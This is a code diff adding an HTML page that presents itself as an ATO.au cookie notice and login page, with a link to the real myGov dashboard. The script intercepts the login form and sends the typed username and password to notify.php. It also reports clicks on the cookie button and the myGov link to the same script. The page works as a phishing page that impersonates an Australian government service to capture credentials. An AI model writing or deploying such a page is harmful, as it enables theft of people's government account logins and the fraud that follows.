@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login and Cookies</title>
+</head>
+<body>
+
+    <h1>Cookies Policy</h1>
+    <p>
+        At ATO.au, we use cookies to improve your experience. By continuing to browse, you agree to the use of cookies.
+    </p>
+
+    <button onclick="notifyClick()">Click to Agree and Continue</button>
+
+    <h1>Login</h1>
+    <form id="loginForm">
+        <label for="username">Username:</label><br>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <input type="submit" value="Login">
+    </form>
+
+    <h1>myGov Dashboard Login</h1>
+    <p>Click the link below to log into your myGov account dashboard:</p>
+    <a href="https://my.gov.au/en/myaccount/dashboard" target="_blank" onclick="notifyMyGovClick()">myGov Dashboard Login</a>
+
+    <script>
+        // Notify when the cookie button is clicked
+        function notifyClick() {
+            fetch('notify.php', {
+                method: 'POST',
+                body: JSON.stringify({ event: 'User clicked cookie agreement' }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+            alert("You agreed to cookies.");
+        }
+
+        // Notify when the myGov link is clicked
+        function notifyMyGovClick() {
+            fetch('notify.php', {
+                method: 'POST',
+                body: JSON.stringify({ event: 'User clicked myGov dashboard login link' }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+
+        // Handle form submission for login
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent actual form submission
+
+            // Gather form data
+            const formData = new FormData(e.target);
+            const data = {
+                username: formData.get('username'),
+                password: formData.get('password')
+            };
+
+            // Send data to the server
+            fetch('notify.php', {
+                method: 'POST',
+                body: JSON.stringify({ event: 'Login attempt', details: data }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                alert('Login data sent to the server');
+            })
+            .catch(error => {
+                alert('There was a problem with your request: ' + error.message);
+            });
+        });
+    </script>
+
+</body>
+</html>
